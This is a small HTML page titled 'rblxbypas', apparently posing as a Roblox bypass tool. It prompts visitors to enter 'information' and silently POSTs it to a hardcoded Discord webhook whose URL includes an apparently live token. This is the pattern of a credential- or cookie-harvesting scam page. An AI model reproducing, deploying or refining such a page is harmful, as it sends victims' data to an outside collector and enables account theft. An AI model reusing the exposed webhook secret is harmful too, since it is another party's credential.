<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>rblxbypas</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        input, button {
            padding: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Welcome to rblxbypas</h1>
    <p>Enter your information below:</p>
    <input type="text" id="userInput" placeholder="Enter something...">
    <button onclick="sendToDiscord()">Submit</button><script>
    function sendToDiscord() {
        const webhookURL = "https://discord.com/api/webhooks/1357337114748129342/x-pyGxpex3twlgDjR2AnvFbR6O9piz0ASpe1Golwzf5pg8oTRiE1hBPcw_K3p4h--fRE"; // Replace with actual webhook URL
        const userInput = document.getElementById("userInput").value;
        
        if (!userInput) {
            alert("Please enter something first.");
            return;
        }
        
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: userInput })
        })
        .then(response => {
            if (response.ok) alert("Sent to Discord!");
            else alert("Failed to send.");
        })
        .catch(error => alert("Error: " + error));
    }
</script>

</body>
</html>
